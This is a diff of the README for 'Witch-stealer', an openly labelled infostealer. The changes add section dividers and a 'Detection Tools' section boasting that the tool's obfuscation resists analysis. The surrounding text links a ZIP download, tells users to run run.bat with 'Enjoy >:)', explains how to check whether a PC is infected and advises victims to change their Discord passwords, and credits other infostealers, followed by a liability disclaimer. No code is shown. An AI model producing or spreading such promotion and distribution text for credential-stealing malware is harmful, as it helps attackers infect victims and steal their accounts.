@@ -71,6 +71,7 @@ To get started, [click here](https://github.com/addadi000/Witch-stealer/archive/
 After downloading the ZIP file, extract it and run `run.bat`. Everything else will install automatically<br>
 Enjoy >:)
 
+---
 
 ## 🖼️ Preview
 
@@ -81,6 +82,8 @@ Enjoy >:)
   <img src="https://raw.githubusercontent.com/addadi000/Witch-stealer/refs/heads/main/.github/img/build.png" width="900" alt="img" />
 </div>
 
+---
+
 ## 🗑️ Uninstall
 🗑️ Press Win+R, then paste the following paths.
 ```Bash
@@ -89,17 +92,28 @@ C:\Users\%username%\AppData\Local\witch
 🎉 If you see an error message, it means your PC is not infected with Witch.
 <p>🗑️ If you see a folder and an infected.txt file, your PC is infected with Witch. Please change your Discord password and take other necessary precautions immediately.
 
+---
+
 ## 🤝 Contributing
 
 Thank you for your interest in contributing to this project! Whether you want to **Report a Bug**, **Submit a Pull Request**, or **Suggest an Improvement**, your input is truly appreciated. To make the process easier for everyone, please check out our **[Contributing Guidelines](CONTRIBUTING.md)**.
 
 You can also support the development of this software by making a **Donation**. Your support helps bring **Better and More refined projects** to life.
 
+---
+
 ## 🙌 Acknowledgments
 This project draws inspiration from various infostealers. Special thanks to:
 - [k4itrun/Wish](https://github.com/k4itrun/wish) - Name Ideas.
 - [addi00000/Empyrean](https://www.youtube.com/watch?v=dQw4w9WgXcQ) - the person who originally came up with the idea for Witch. Without Empyrean, Witch would not exist.
 - [Aspw-w/Python-test](https://github.com/Aspw-w/Python-Test) - Thanks to aspw-w for reminding me about the friend invite generation feature.
+
+---
+
+## 🔎 Detection Tools
+Detection tools for the Witch Stealer are currently in development It will take at least a week to complete, as even developers are finding it difficult to deobfuscate.<br>
+
+---
 
 
 ### ⚠️ Disclaimer
@@ -108,11 +122,11 @@ This project draws inspiration from various infostealers. Special thanks to:
 
 By utilizing this tool, you take full responsibility for your actions. The creator disclaims any liability for misuse. It is your responsibility to ensure that your use of this software complies with all applicable laws and regulations.
 
-### 🚫 No Assistance
+#### 🚫 No Assistance
 
 The creator will not provide assistance or support for any misuse of this tool. Any inquiries related to harmful or illegal activities will be ignored.
 
-### ✅ Terms Acceptance
+#### ✅ Terms Acceptance
 
 By using this tool, you agree to abide by this disclaimer. If you do not agree with these terms, please do not use the software.
 
@@ -133,6 +147,7 @@ By using this tool, you agree to abide by this disclaimer. If you do not agree w
 </a>
   </ol>
 </details>
+
 
 
 <div align="center">
